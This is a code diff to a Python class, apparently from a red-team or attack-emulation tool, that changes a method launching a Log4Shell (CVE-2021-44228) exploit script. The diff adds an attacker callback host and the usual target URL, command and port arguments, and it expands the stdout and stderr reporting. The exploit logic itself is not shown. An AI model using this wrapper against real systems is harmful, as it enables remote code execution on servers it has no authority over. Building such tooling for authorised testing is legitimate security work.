@@ -333,6 +333,10 @@ class Trainman:
         return output
 
     def exploit_cve_2021_44228(self):
+        if 'callback' in self.args:
+            callback = self.args['callback']
+        else:
+            callback = {self.host_info[2]}
         if 'target_url' in self.args:
             target_url = self.args['target_url']
         else:
@@ -363,7 +367,8 @@ class Trainman:
         os.environ['PATH'] = os.environ['PATH'] + ':/root/.jabba/jdk/adopt@1.8.0-292/bin'
         env.update(os.environ)
         exploit_cve_2021_44228_cmd = \
-            f'python3 main.py -i {self.host_info[0]} -u {target_url} -c {exec_cmd} -p {http_port} -l {ldap_port}'
+            f'python3 main.py -i {self.host_info[2]} -e {callback} -u {target_url} -c {exec_cmd} -p {http_port} ' \
+            f'-l {ldap_port}'
         exploit_cve_2021_44228 = subprocess.Popen(
             exploit_cve_2021_44228_cmd,
             stdin=subprocess.PIPE,
@@ -390,13 +395,16 @@ class Trainman:
                 output = {
                     'outcome': 'failed',
                     'message': 'exploit_cve_2021_44228 executed but failed to exploit target. '
-                               f'Exploit results: {exploit_cve_2021_44228_output.decode()}',
+                               f'stdout: {exploit_cve_2021_44228_output.decode()}, '
+                               f'stderr: {exploit_cve_2021_44228_error.decode()}',
                     'forward_log': 'True'
                 }
         else:
             output = {
                 'outcome': 'failed',
-                'message': exploit_cve_2021_44228_error.decode(),
+                'message': 'exploit_cve_2021_44228 execution failed. '
+                            f'stdout: {exploit_cve_2021_44228_output.decode()}, '
+                            f'stderr: {exploit_cve_2021_44228_error.decode()}',
                 'forward_log': 'True'
             }
         return output
